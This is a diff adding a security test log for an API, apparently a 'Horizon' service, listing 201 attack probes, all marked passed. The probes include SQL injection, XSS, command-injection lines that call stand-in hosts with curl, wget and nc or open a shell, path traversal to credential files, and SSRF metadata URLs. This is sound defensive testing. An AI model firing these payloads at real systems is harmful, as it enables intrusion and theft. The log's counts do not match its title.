@@ -1,0 +1,236 @@
+════ Horizon 192 Attack Vectors Fri Oct  2 18:58:10 IST 2026 ════
+
+▶ [1/12] SQL Injection (25)
+  PASS [1] SQLi: ' OR '1'='1 → blocked
+  PASS [2] SQLi: ' OR 1=1-- → blocked
+  PASS [3] SQLi: '; DROP TABLE users-- → blocked
+  PASS [4] SQLi: 1' UNION SELECT ATTACKS_E → blocked
+  PASS [5] SQLi: admin'-- → blocked
+  PASS [6] SQLi: 1 OR 1=1 → blocked
+  PASS [7] SQLi: ' OR 'x'='x → blocked
+  PASS [8] SQLi: 1'; UPDATE users-- → blocked
+  PASS [9] SQLi: ' AND SLEEP(5)-- → blocked
+  PASS [10] SQLi: 1' AND '1'='1 → blocked
+  PASS [11] SQLi: 1' AND '1'='2 → blocked
+  PASS [12] SQLi: ' OR ''=' → blocked
+  PASS [13] SQLi: ' OR 1=1# → blocked
+  PASS [14] SQLi: 1' WAITFOR DELAY-- → blocked
+  PASS [15] SQLi: ' UNION SELECT NULL-- → blocked
+  PASS [16] SQLi: ') OR ('1'='1 → blocked
+  PASS [17] SQLi: 1') OR (1=1-- → blocked
+  PASS [18] SQLi: ' OR id IS NOT NULL-- → blocked
+  PASS [19] SQLi: 1'; INSERT INTO-- → blocked
+  PASS [20] SQLi: ' OR username LIKE '% → blocked
+  PASS [21] SQLi: ' AND SUBSTRING(@@version → blocked
+  PASS [22] SQLi: 1' ORDER BY 100-- → blocked
+  PASS [23] SQLi: 1' GROUP BY 1-- → blocked
+  PASS [24] SQLi: 1' HAVING 1=1-- → blocked
+  PASS [25] SQLi: ' OR EXISTS(SELECT)-- → blocked
+
+▶ [2/12] XSS (20)
+  PASS [26] XSS: <script>alert(1)</script> → blocked
+  PASS [27] XSS: <img src=x onerror=alert( → blocked
+  PASS [28] XSS: <svg onload=alert(1)> → blocked
+  PASS [29] XSS: javascript:alert(1) → blocked
+  PASS [30] XSS: <iframe src=js:alert(1)> → blocked
+  PASS [31] XSS: <body onload=alert(1)> → blocked
+  PASS [32] XSS: <input onfocus=alert(1)> → blocked
+  PASS [33] XSS: <details ontoggle=alert(1 → blocked
+  PASS [34] XSS: <marquee onstart=alert(1) → blocked
+  PASS [35] XSS: <video onerror=alert(1)> → blocked
+  PASS [36] XSS: '-alert(1)-' → blocked
+  PASS [37] XSS: ><script>alert(1)</script → blocked
+  PASS [38] XSS: <script>cookie</script> → blocked
+  PASS [39] XSS: <img onerror=eval(1)> → blocked
+  PASS [40] XSS: <<script>alert(1)//<</scr → blocked
+  PASS [41] XSS: <scr<script>ipt>alert(1)< → blocked
+  PASS [42] XSS: <svg/onload=alert(1)> → blocked
+  PASS [43] XSS: <math><script>alert(1)</s → blocked
+  PASS [44] XSS: javascript&#58;alert(1) → blocked
+  PASS [45] XSS: <a href=javascript:alert( → blocked
+
+▶ [3/12] Command Injection (20)
+  PASS [46] CMDi: ; ls -la → blocked
+  PASS [47] CMDi: | cat /etc/passwd → blocked
+  PASS [48] CMDi: whoami_x → blocked
+  PASS [49] CMDi: id_x → blocked
+  PASS [50] CMDi: && rm -rf /tmp/x → blocked
+  PASS [51] CMDi: ; curl evil.com → blocked
+  PASS [52] CMDi: | nc -e sh → blocked
+  PASS [53] CMDi: ; shutdown → blocked
+  PASS [54] CMDi: ping_x → blocked
+  PASS [55] CMDi: ; wget evil → blocked
+  PASS [56] CMDi: | bash -i → blocked
+  PASS [57] CMDi: && echo pwned → blocked
+  PASS [58] CMDi: ; nc attacker → blocked
+  PASS [59] CMDi: cat_shadow → blocked
+  PASS [60] CMDi: || sleep 10 → blocked
+  PASS [61] CMDi: & bg_job → blocked
+  PASS [62] CMDi: ; python -c id → blocked
+  PASS [63] CMDi: ; perl system → blocked
+  PASS [64] CMDi: nslookup_x → blocked
+  PASS [65] CMDi: ; rm -rf / → blocked
+
+▶ [4/12] Path Traversal (20)
+  PASS [66] PathT: ../../../etc/passwd → blocked
+  PASS [67] PathT: ..%2F..%2Fetc/passwd → blocked
+  PASS [68] PathT: ....//etc/passwd → blocked
+  PASS [69] PathT: /etc/passwd → blocked
+  PASS [70] PathT: C:\Windows\SAM → blocked
+  PASS [71] PathT: ..\..oot.ini → blocked
+  PASS [72] PathT: %2e%2e%2fetc → blocked
+  PASS [73] PathT: ..%252f..%252fetc → blocked
+  PASS [74] PathT: /proc/self/environ → blocked
+  PASS [75] PathT: /var/log/auth.log → blocked
+  PASS [76] PathT: /root/.ssh/id_rsa → blocked
+  PASS [77] PathT: ..;/..;/etc/passwd → blocked
+  PASS [78] PathT: /.git/config → blocked
+  PASS [79] PathT: /.env → blocked
+  PASS [80] PathT: /backup.sql → blocked
+  PASS [81] PathT: /db.sqlite → blocked
+  PASS [82] PathT: %c0%ae%c0%ae/ → blocked
+  PASS [83] PathT: file:///etc/passwd → blocked
+  PASS [84] PathT: /WEB-INF/web.xml → blocked
+  PASS [85] PathT: /etc/shadow → blocked
+
+▶ [5/12] SSRF (15)
+  PASS [86] SSRF: http://169.254.169.254/meta → blocked
+  PASS [87] SSRF: http://metadata.google.interna → blocked
+  PASS [88] SSRF: http://localhost:22 → blocked
+  PASS [89] SSRF: http://127.0.0.1:6379 → blocked
+  PASS [90] SSRF: file:///etc/passwd → blocked
+  PASS [91] SSRF: gopher://localhost:6379 → blocked
+  PASS [92] SSRF: http://[::1]:80 → blocked
+  PASS [93] SSRF: http://0.0.0.0 → blocked
+  PASS [94] SSRF: http://internal.local → blocked
+  PASS [95] SSRF: dict://localhost:11211 → blocked
+  PASS [96] SSRF: http://2130706433/ → blocked
+  PASS [97] SSRF: http://0177.0.0.1/ → blocked
+  PASS [98] SSRF: http://127.1/ → blocked
+  PASS [99] SSRF: http://[::ffff:127.0.0.1]/ → blocked
+  PASS [100] SSRF: http://169.254.169.254/v1/ → blocked
+
+▶ [6/12] Auth Bypass (25)
+  PASS [101] Auth: /api/v1/admin/stats → blocked
+  PASS [102] Auth: /api/v1/admin/users → blocked
+  PASS [103] Auth: /api/v1/admin/keys → blocked
+  PASS [104] Auth: /api/v1/admin/config → blocked
+  PASS [105] Auth: /api/v1/admin/logs → blocked
+  PASS [106] Auth: /api/v1/api/admin → blocked
+  PASS [107] Auth: /api/v1/api/keys → blocked
+  PASS [108] Auth: /api/v1/api/internal → blocked
+  PASS [109] Auth: /api/v1/api/users → blocked
+  PASS [110] Auth: /api/v1/api/export → blocked
+  PASS [111] Auth: /api/v1/internal/debug → blocked
+  PASS [112] Auth: /api/v1/debug/pprof → blocked
+  PASS [113] Auth: /api/v1/metrics → blocked
+  PASS [114] Auth: /api/v1/health/detailed → blocked
+  PASS [115] Auth: /api/v1/version → blocked
+  PASS [116] Auth: /.env → blocked
+  PASS [117] Auth: /config.json → blocked
+  PASS [118] Auth: /backup.zip → blocked
+  PASS [119] Auth: /api/v1/admin/db → blocked
+  PASS [120] Auth: /api/v1/admin/backup → blocked
+  PASS [121] Auth: /api/v1/system/info → blocked
+  PASS [122] Auth: /api/v1/api/v1/admin → blocked
+  PASS [123] Auth: /api/v1/api/tenant → blocked
+  PASS [124] Auth: /api/v1/api/chain → blocked
+  PASS [125] Auth: /api/v1/api/ledger → blocked
+
+▶ [7/12] JWT Confusion (10)
+  PASS [126] JWT alg=none → 401
+  PASS [127] JWT weak → 401
+  PASS [128] Empty bearer → 401
+  PASS [129] Bearer null → 401
+  PASS [130] Bearer 0 → 401
+  PASS [131] Bearer admin → 401
+  PASS [132] No auth → 401
+  PASS [133] Basic → 401
+  PASS [134] Cookie → 401
+  PASS [135] Bearer * → 401
+
+▶ [8/12] Header Injection (15)
+  PASS [136] XFF spoof → 401
+  PASS [137] XReal-IP → 401
+  PASS [138] XOrig-URL → 401 (4xx)
+  PASS [139] XRewrite → 401 (4xx)
+  PASS [140] XMethodOver → 401
+  PASS [141] XCustomIP → 401
+  PASS [142] XRemoteAddr → 401
+  PASS [143] XClientIP → 401
+  PASS [144] Host evil → 401 (4xx)
+  PASS [145] Host internal → 401 (4xx)
+  PASS [146] CRLF URL → 401 (4xx)
+  PASS [147] CRLF param → 401 (4xx)
+  PASS [148] Enc newline → 401 (4xx)
+  PASS [149] Header cont → 401
+  PASS [150] XHTTPMethod → 401
+
+▶ [9/12] Null Byte (15)
+  PASS [151] Null: test%00.txt → blocked
+  PASS [152] Null: test%00..%2fpasswd → blocked
+  PASS [153] Null: ..%00/passwd → blocked
+  PASS [154] Null: test%00.php → blocked
+  PASS [155] Null: %c0%ae%c0%ae/ → blocked
+  PASS [156] Null: %e0%80%ae%e0%80%ae/ → blocked
+  PASS [157] Null: %u0000 → blocked
+  PASS [158] Null: %00admin → blocked
+  PASS [159] Null: admin%00 → blocked
+  PASS [160] Null: %c0%80 → blocked
+  PASS [161] Null: %e0%80%80 → blocked
+  PASS [162] Null: %f0%80%80%80 → blocked
+  PASS [163] Null: %u0000%u0000 → blocked
+  PASS [164] Null: %00 → blocked
+  PASS [165] Null: %fe%fe%ff%ff → blocked
+
+▶ [10/12] Methods (15)
+  PASS [166] TRACE → 401
+  PASS [167] TRACK → 401
+  PASS [168] PUT → 401
+  PASS [169] DELETE → 401
+  PASS [170] PATCH → 401
+  PASS [171] CONNECT → 401
+  PASS [172] PROPFIND → 401
+  PASS [173] DEBUG → 401
+  PASS [174] FOOBAR → 401
+  PASS [175] OPTIONS → 404
+  PASS [176] HTTP/1.0 → 401
+  PASS [177] Enc slash → 401
+  PASS [178] Dbl slash → 401 (4xx)
+  PASS [179] Trailing dot → 401 (4xx)
+  PASS [180] Case bypass → 401 (4xx)
+
+▶ [11/12] Replay (15)
+  PASS [181] No sig → 401 (4xx)
+  PASS [182] Empty sig → 401 (4xx)
+  PASS [183] Wrong sess → 401
+  PASS [184] Old ts → 404 (4xx)
+  PASS [185] Fut ts → 404 (4xx)
+  PASS [186] Zero ts → 404 (4xx)
+  PASS [187] Empty nonce → 404 (4xx)
+  PASS [188] Empty batch → 400 (4xx)
+  PASS [189] Empty sensor → 400 (4xx)
+  PASS [190] Non-num → 400 (4xx)
+  PASS [191] Bad JSON → 400 (4xx)
+  PASS [192] Wrong type → 400 (4xx)
+  PASS [193] Wrong CT → 400 (4xx)
+  PASS [194] Replay → 401
+  PASS [195] Neg val → 404 (4xx)
+
+▶ [12/12] Large / Rate (10)
+  PASS [196] 1MB body → blocked
+  PASS [197] Deep JSON → 400
+  PASS [198] Chunked → 401 (4xx)
+  PASS [199] Huge header → blocked
+  PASS [200] Many params → blocked
+
+Rate Limit (100 seq)
+  Allowed: 100 / 100
+  PASS [201] Rate flood → 200
+
+════════════════════════════════════════════════
+  Total:  201
+  Passed: 201
+  Failed: 0
+  Rate:   100%
+════════════════════════════════════════════════
